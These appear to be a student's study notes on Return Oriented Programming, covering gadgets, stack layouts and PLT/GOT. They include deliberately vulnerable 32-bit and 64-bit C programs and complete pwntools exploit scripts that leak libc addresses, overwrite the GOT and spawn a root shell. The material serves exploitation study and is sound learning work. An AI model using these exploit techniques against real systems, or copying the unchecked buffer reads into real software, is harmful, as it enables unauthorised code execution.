---
title: Lazenca.net notes - ROP
tags: assignment2 lazenca rop
---

## ROP (Return Oriented Programming)

ROP lets attackers bypass code-signing and NXbit protection.

### 0.0 Gadgets
ROP is simillar to RTL (Return to Libc), because it requires bof vulnerability to make it work. But additionally, ROP uses ``Gadgets``.

- Gadgets allows you to excecute arbitrary code
- Gadgets usually ends with the instruction ``ret``
- Gadgets are stored inside program code or shared library

Gadgets looks something like this:

32bit:
- pop; pop; pop; ret
- pop; pop; ret;
- ret;

These change the ``ESP`` value, allowing the attacker to use multiple functions. (RTL only uses one function)

For 32bit, operand of ``pop`` doesnt matter since it uses ``CDECL`` (args are passed by stack, registers doesn't matter)

But for 64bit, args are passed by registers (``System V AMD64 ABI``). So, operand does matter in this case.

64bit:
- pop rdi; ret
- pop rsi; ret
- pop rdx; ret

### 0.1 Structure

The ROP buffer structure looks like this:

32bit:

|Address|Value|
|--|--|
|ebp+4|first function (3 args)|
|ebp+8|gadget address (pop;pop;pop;ret)|
|ebp+12|first arg|
|ebp+16|second arg|
|ebp+20|third arg|
|ebp+24|second function (1 arg)|
|ebp+28|gadget address (pop;ret)|
|ebp+32|first arg|
|...|...|

64bit:

|Address|Value|
|--|--|
|rbp+8|gadget for 1st arg (pop rdi, ret)|
|rbp+16|first arg|
|rbp+24|gadget for 2nd arg (pop rsi, ret)|
|rbp+32|second arg|
|rbp+40|first function (2 args)|
|rbp+48|gadget for 1st arg (pop rdi, ret)|
|rbp+56|first arg|
|rbp+64|second function (1 args)|
|...|...|


### 0.2 PLT & GOT
GOT (Global offset table) is a table of addresses that points to functions from shared library. The dynamic linker does the job of saving the addresses.  

PLT (Procedure linkage table) contains code that calls the function from shared library.
- first plt call: links addresses to GOT
- after: gets addresses from GOT

In ROP, we can make good use of these two

ex)
- libc address leak
- ...

### 0.3 Proof of Concept (32bit)
```c
#include <stdio.h>
#include <unistd.h>

void vuln(){
    char buf[50];
    read(0, buf, 256);
}

void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```
in this program we're going to:
1. get writable area and write /bin/sh
2. leak libc address using write@got
3. calculate the system function address in shared library
4. overwrite the write@got with system address
5. call write@plt > system

exploit:
```python
from pwn import *
from struct import *

#context.log_level = 'debug'

binsh = "/bin/sh"

binary = ELF('./rop')

#32bit OS
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
#64bit OS
#libc = ELF("/lib32/libc-2.23.so")
rop = ROP(binary)

print binary.checksec()

read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']
read_system_offset = libc.symbols['read'] - libc.symbols['system']
writableArea = 0x0804a050

#Address info
log.info("read@plt : " + str(hex(read_plt)))
log.info("read@got : " + str(hex(read_got)))
log.info("write@plt : " + str(hex(write_plt)))
log.info("write@got : " + str(hex(write_got)))
log.info("read system offset : " + str(hex(read_system_offset)))
log.info("Writeable area : " + str(writableArea))

#ROP Code
rop.read(0,writableArea,len(str(binsh)))
rop.write(1,read_got,4)
rop.read(0,read_got,len(str(read_got)))
rop.raw(read_plt)
rop.raw(0xaaaabbbb)
rop.raw(writableArea)
payload = "A"*62 + str(rop)

#Run
r = process("./rop")
r.recvn(10)
r.send(payload + '\n')
r.send(binsh)
read = u32(r.recvn(4))
system_addr = read - read_system_offset
rop = ROP(binary)
rop.raw(system_addr)
r.send(str(rop))

r.interactive()
```

### 0.4 Proof of Concept (64bit)
```c

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}

void main(){
    seteuid(getuid());
    write(1,"Hello ROP\n",10);
    vuln();
}
```
Unlike 32bit poc, the program gives us the address of printf@got, so no need for libc leak

This is what we're going to do:

1. find /bin/sh from Libc
2. find gadgets (3 args)
3. setresuid(.., .., ..)
4. system('/bin/sh')

exploit:
```python
from pwn import *

printfoff = 0x55800
systemoff = 0x45390
binshoff = 0x18cd57
suidoff = 0xcd570

p1 = 0x400843
p23 = 0x400841
p4off = 0x1b92

r = process('./rop64')
r.recvn(29)

printf =  int(r.recvn(14),16)
base = printf-printfoff

p4 = base + p4off

payload = 'a'*(0x40+8)

payload += p64(p1)
payload += p64(0)

payload += p64(base + 0x1150c9)
payload += p64(0)
payload += p64(0)

payload += p64(base + suidoff)
payload += p64(p1)
payload += p64(base + binshoff)
payload += p64(base + systemoff)

r.send(payload+'\n')
r.interactive()
```
